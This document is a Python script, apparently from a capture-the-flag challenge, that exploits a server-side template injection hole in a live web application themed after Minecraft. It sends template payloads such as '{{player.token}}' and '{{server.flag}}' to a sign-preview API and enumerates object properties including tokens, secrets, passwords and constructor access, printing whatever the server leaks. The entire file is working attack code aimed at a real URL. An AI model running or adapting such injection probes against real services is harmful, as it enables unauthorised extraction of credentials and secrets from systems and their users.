#!/usr/bin/env python3
import requests

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)

def ssti(payload):
    r = s.post(BASE + '/api/sign/preview',
               json={'lines': [payload, '', '', '']},
               timeout=20)
    try:
        data = r.json()
        return data.get('lines', [None])[0]
    except:
        return r.text[:500]

# Explore player object
print('=== player ===')
player_props = ['username', 'name', 'displayName', 'uuid', 'permission',
                'level', 'op', 'isOp', 'role', 'rank', 'health',
                'gamemode', 'dimension', 'x', 'y', 'z', 'pos',
                'session', 'token', 'secret', 'key', 'password',
                'inventory', 'data', 'nbt', 'tags', 'scores',
                'setPermission', 'elevate', 'toString', 'toJSON', 'valueOf',
                'constructor']
for p in player_props:
    r = ssti('{{player.' + p + '}}')
    if r not in ['UNKNOWN BLOCK PROPERTY', 'TEMPLATE RUNE NOT FOUND']:
        print(f'  player.{p}: {r}')

print()
print('=== server ===')
server_props = ['name', 'version', 'motd', 'ip', 'port', 'players',
                'ops', 'opsList', 'whitelist', 'config', 'properties',
                'secret', 'key', 'token', 'flag', 'dimension',
                'world', 'chunks', 'data', 'nbt', 'telemetry', 'log',
                'legacy', 'debug', 'toString', 'toJSON', 'valueOf',
                'constructor', 'tps', 'maxPlayers', 'online',
                'uptime', 'seed', 'level', 'difficulty', 'gamemode']
for p in server_props:
    r = ssti('{{server.' + p + '}}')
    if r not in ['UNKNOWN BLOCK PROPERTY', 'TEMPLATE RUNE NOT FOUND']:
        print(f'  server.{p}: {r}')

print()
print('=== world ===')
world_props = ['name', 'seed', 'time', 'weather', 'dimension', 'chunks',
               'spawn', 'border', 'difficulty', 'rules', 'data',
               'nbt', 'level', 'version', 'toString', 'toJSON', 'valueOf',
               'constructor', 'generator', 'type', 'biome', 'players',
               'entities', 'structures', 'loaded', 'cached']
for p in world_props:
    r = ssti('{{world.' + p + '}}')
    if r not in ['UNKNOWN BLOCK PROPERTY', 'TEMPLATE RUNE NOT FOUND']:
        print(f'  world.{p}: {r}')
